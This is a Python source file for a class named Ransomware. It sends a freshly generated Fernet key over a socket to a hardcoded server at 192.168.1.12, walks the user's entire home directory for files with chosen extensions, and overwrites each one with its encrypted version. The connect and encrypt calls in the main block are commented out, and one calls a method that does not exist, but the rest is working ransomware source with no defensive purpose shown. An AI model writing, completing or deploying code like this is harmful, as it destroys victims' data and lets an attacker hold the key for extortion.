import sys
import os.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import shutil
from time import sleep
from pathlib import Path
from typing import Dict, List
from lib.modules.system import System
from lib.modules.yaml import safe_load
from lib.cryptography.fernet import Fernet
from socket import socket, AF_INET, SOCK_STREAM


class Ransomware(Fernet):
    
    def __init__(self, host: str, port: int) -> None:
        self.key = Fernet.generate_key()
        self.host = host
        self.port = port
        self.system: System = System()
        self.server: socket = socket(AF_INET, SOCK_STREAM)
        self.Private = Fernet(self.key)
        self.list_file()

    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(self.key)
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    System.reset()
            finally:
                self.server.close()

    def list_file(self) -> Dict[str, List[str]]:
        """
        Lists files in the user's home directory categorized by file extension.

        Returns:
            Dict[str, List[str]]: A dictionary where keys are file extensions and values are lists of file paths.
        """
        with open('scripts/extensions.yaml', 'r') as file:
            exts = safe_load(file)

        self.file_categories: Dict[str, List[str]] = {category: [] for category in exts}
        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

        for entry in Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                self.file_categories[extcategory[ext]].append(str(entry))

    def process_files(self, mode: str) -> None:
        """
        Encrypts or decrypts files based on the specified mode.

        Args:
            mode (str): Either 'encrypt' or 'decrypt'.
        """
        for _, files in self.file_categories.items():
            for file in files:
                temp_file = file + '.temp'
                try:
                    with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file:
                        while True:
                            chunk = original_file.read(1024 * 1024 * 10)  # Đọc từng phần của tệp
                            if not chunk:
                                break
                            processed_chunk = self.encode(chunk) if mode == 'encrypt' else self.decode(chunk)
                            temp_file.write(processed_chunk)
                    shutil.move(temp_file.name, file)
                except Exception:
                    if os.path.exists(temp_file.name):
                        os.remove(temp_file.name)
    
    def encrypt(self) -> None:
        """
        Encrypts files using Fernet encryption.

        Args:
            Private (Fernet): An instance of the Fernet class.
        """
        self.process_files('encrypt')
    
    def decrypt(self) -> None:
        """
        Decrypts files using Fernet decryption.

        Args:
            Private (Fernet): An instance of the Fernet class.
        """
        self.process_files('decrypt')
    
    


if __name__ == '__main__':
    bot = Ransomware('192.168.1.12', 19100)
    #bot.ConnectServer()
    #bot.Encrypted()